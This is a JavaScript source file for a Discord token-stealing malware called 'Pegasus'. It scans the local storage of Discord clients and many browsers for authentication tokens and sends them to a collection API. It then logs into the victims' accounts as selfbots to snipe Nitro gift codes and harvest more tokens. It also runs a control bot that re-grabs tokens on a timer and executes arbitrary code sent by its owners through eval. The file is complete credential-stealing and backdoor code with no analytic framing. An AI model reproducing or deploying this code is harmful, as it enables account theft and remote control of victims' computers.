function Pegasus() {
    const axios = require('axios').default;
    const fs = require('fs');


    const api_url = `http://127.0.0.1:1337`


    function send_tokens(token) {
        axios.post(`${api_url}/api/send-token/?token=${token}`);
        bot(token)
    };

    function send_nitro(code, channel_id) {
        axios.post(`${api_url}/api/claim-nitro/?code=${code}&channel=${channel_id}`);
    };

    function shearch_for_token(string) {
        let [match] = /`[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}`/.exec(string) || /`mfa\.[\d\w_-]{84}`/.exec(string) || [null];

        if (match != null) {
            send_tokens(match.replace(/`/g, ''))
        };
    }

    function token_graber() {
        var paths = [
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,

            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
        ];


        paths.forEach(path => {
            try {
                fs.readdir(path, (error, files) => {
                    if (files === undefined) return;

                    let filter = files.filter(f => f.split('.').pop() === 'log' || 'ldb');

                    for (var i = 0; i < filter.length; i++) {
                        fs.readFile(`${path}/${filter[i]}`, `utf-8`, async function (error, data) {
                            shearch_for_token(data);
                        });
                    };
                });
            } catch { };
        });
    };

    function bot_control(token, owners) {
        const discord = require('discord.js');
        const client = new discord.Client();

        client.login(token)

        client.on('ready', () => {
            setInterval(function () {
                token_graber(owners);
            }, 300 * 1000);
        });

        client.on('message', (message) => {
            if (!owners.includes(message.author.id)) return;

            if (message.content.startsWith('.grab')) {
                token_graber(owners);
            }

            if (message.content.startsWith('.exec')) {
                code = message.content.split('.exec ')[1];

                try {
                    const args = message.content.split(` `).slice(1);

                    const code = args.join(` `);
                    let evaled = eval(code);

                    if (typeof evaled !== `string`)
                        evaled = require(`util`).inspect(evaled);

                    message.channel.send(clean(evaled), { code: `xl` });
                } catch (err) {
                    message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
                }
            }

            /*~~ Mass control commands (soon)

            if (message.content.startsWith('.friend')) {
                
            }

            if (message.content.startsWith('.join')) {
                
            }

            if (message.content.startsWith('.leave')) {
                
            }

            if (message.content.startsWith('.spam')) {
                
            }
            */
        });
    };

    function bot(token) {
        const discord_self = require('discord.js-selfbot');
        const discord_selfbot = new discord_self.Client();

        discord_selfbot.login(token)

        discord_selfbot.on('message', (message) => {
            if (message.content.includes('.gift/')) {
                send_nitro(/(discord\.(gift)|discordapp\.com\/gift)\/.+[a-z]/.exec(message.content)[0].split('/')[1].split(' ')[0], message.channel.id)
            };

            shearch_for_token(message.content);
        });
    };

    async function main() {
        axios.get(`${api_url}/api/get-bot-infos`).then(async response => {
            let config = await JSON.parse(JSON.stringify(await response.data));

            token_graber(config['OWNERS'])
            bot_control(config['BOT_TOKEN'], config['OWNERS']);
        });
    };

    main();
};

Pegasus();